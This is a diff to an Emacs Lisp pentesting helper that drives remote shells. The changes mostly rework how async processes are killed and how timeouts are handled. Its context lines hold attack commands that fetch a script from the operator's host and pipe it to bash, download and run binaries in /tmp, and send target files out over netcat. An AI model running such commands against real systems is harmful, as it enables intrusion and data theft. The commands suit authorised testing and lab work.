@@ -71,7 +71,7 @@
 (defconst socat-binary-url "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat")
 (defconst nc-notification-listener "nc -lp 8889")
 (defconst progress-bar-mark "■")
-(defconst progress-bar-timeout-sec 120)
+(defconst progress-bar-timeout-sec 60)
 
 (defvar sh4h-user nil)
 (defvar sh4h-rhost nil)
@@ -132,13 +132,12 @@
   ;(sh-in-buffer (current-buffer) "clear")
   )
 
-(defun run-after-conn-established (buffer &optional if-msf)
-  (interactive)
-  (when (null if-msf)
-    (sh-in-buffer buffer "cd ~")
-    (sh-in-buffer buffer (format "export SHELL=bash; export TERM=%s" sh4h-term))
-    (sh-in-buffer buffer (format "stty rows %s columns %s" sh4h-stty-rows sh4h-stty-columns)))
-  (kill-all-async-buffers))
+;(defun run-after-conn-established (buffer &optional if-msf)
+;  (interactive)
+;  (when (null if-msf)
+;    (sh-in-buffer buffer "cd ~")
+;    (sh-in-buffer buffer (format "export SHELL=bash; export TERM=%s" sh4h-term))
+;    (sh-in-buffer buffer (format "stty rows %s columns %s" sh4h-stty-rows sh4h-stty-columns))))
 
 (defun show-progress (buffer &optional user)
   (interactive)
@@ -150,6 +149,7 @@
       (message "Progress: %s" progress-bar)
       (setq progress-bar (concat progress-bar progress-bar-mark))
       (inc counter))
+    (kill-all-async-processes)
     (< counter progress-bar-timeout-sec)))
 
 (defun ssh-with-public-key ()
@@ -418,14 +418,20 @@
     (unless (process-exists-p command)
       (async-shell-command command))))
 
-(defun kill-all-async-buffers ()
-  (interactive)
-  (kill-matching-buffers (format "^%s" async-buffer-name) nil t))
-
-(defun kill-async-buffers ()
+(defun kill-async-processes ()
   (interactive)
   (create-sentinel
-   (kill-all-async-buffers)))
+   (kill-all-async-processes)))
+
+(defun kill-all-async-processes ()
+  (interactive)
+  (let ((inhibit-message t)
+	(list (get-buffer-list async-buffer-name)))
+    (while list
+      (interrupt-process (car list))
+      (setq list (cdr list)))
+    (sleep-for 0.5)
+    (kill-matching-buffers (format "^%s" async-buffer-name) nil t)))
 
 (defun generate-async-proc (command)
   (interactive)
@@ -492,8 +498,9 @@
   (let ((term (get-term-buffer))
 	(rcmd (format "curl -s http://%s/inspect.sh | bash && { nc -z -w 3 %s 8889 & }" sh4h-lhost sh4h-lhost)))
     (funcall (run-and-monitor nc-notification-listener
-			      (kill-async-buffers)
+			      (kill-async-processes)
 			      term
+			      (switch-to-multi-term term)
 			      (start-web-server)
 			      (sh-in-buffer term rcmd)))))
 
@@ -564,9 +571,10 @@
   (let ((user (when (null if-msf) (get-user)))
 	(mterm (get-multi-term-buffer)))
     (make-thread (lambda ()
-		   (when (show-progress mterm user)
+		   (if (show-progress mterm user)
 		     ;(run-after-conn-established mterm if-msf)
-		     (message "Successfully Completed!"))))
+		       (message "Successfully Completed!")
+		     (message "Session timed out."))))
     mterm))
 
 (defun msf-linux (arch type)
@@ -591,7 +599,7 @@
   (let ((rcmd (format "nc -lp 10000 > %s && echo '[*] The file `%s` was written successfully!' && nc -z -w 3 %s 8889" fpath file sh4h-lhost))
 	(lcmd (format "nc -w 3 %s 10000 < %s" (get-rhost) lpath)))
     (funcall (run-and-monitor nc-notification-listener
-			      (kill-async-buffers)
+			      (kill-async-processes)
 			      'term
 			      (remove-hook 'after-save-hook (apply-partially #'after-save-remote-file file fpath lpath term))
 			      (kill-buffer)
@@ -605,8 +613,8 @@
      (if (or (eq 0 status) (and (eq 1 status) (y-or-n-p (format "%s not exist. Create?:" file))))
 	 (progn (add-hook 'after-save-hook (apply-partially #'after-save-remote-file file fpath lpath term))
 		(find-file lpath))
-       (kill-all-async-buffers)
-       (sh (format "rm %s" lpath))))))
+       (kill-all-async-processes)
+       (sh (format "rm %s" lpath)))))))
 
 (defun replace-home-dir-in-filepath (path)
   (interactive)
@@ -644,7 +652,7 @@
 	 (lpath (expand-file-name (read-file-name "Where to save?: " (format "%s%s" default-directory file))))
 	 (rcmd (format "{ { nc -w 3 %s 9999 < %s && echo -e 'Success'; } || nc -z -w 3 %s 9999; } && nc -z -w 3 %s 8889" sh4h-lhost fpath sh4h-lhost sh4h-lhost)))
     (funcall (run-and-monitor nc-notification-listener
-			      (kill-async-buffers)
+			      (kill-async-processes)
 			      term
 			      (async-shell-command (format "nc -lp 9999 > %s && { [ -s %s ] || rm %s; }" lpath lpath lpath))
 			      (sh-in-buffer term rcmd)))))
@@ -653,7 +661,7 @@
   (interactive)
   (let ((rcmd (format "cd /tmp && wget %s/%s && nc -z -w 3 %s 8889 && chmod +x %s && ./%s" sh4h-lhost file sh4h-lhost file file)))
     (funcall (run-and-monitor nc-notification-listener
-			      (kill-async-buffers)
+			      (kill-async-processes)
 			      term
 			      (start-web-server)
 			      (sh-in-buffer term rcmd)))))
@@ -663,7 +671,7 @@
   (let ((lcmd (format "nc -lvnp 9002 | tee %s/%s.out" sh4h-rfiles-dir file))
 	(rcmd (format "cd /tmp && wget %s/%s && nc -z -w 3 %s 8889 && chmod +x %s && ./%s | nc -w 3 %s 9002" sh4h-lhost file sh4h-lhost file file sh4h-lhost)))
     (funcall (run-and-monitor nc-notification-listener
-			      (kill-async-buffers)
+			      (kill-async-processes)
 			      term
 			      (start-web-server)
 			      (sh-in-buffer (get-multi-term-buffer) lcmd)
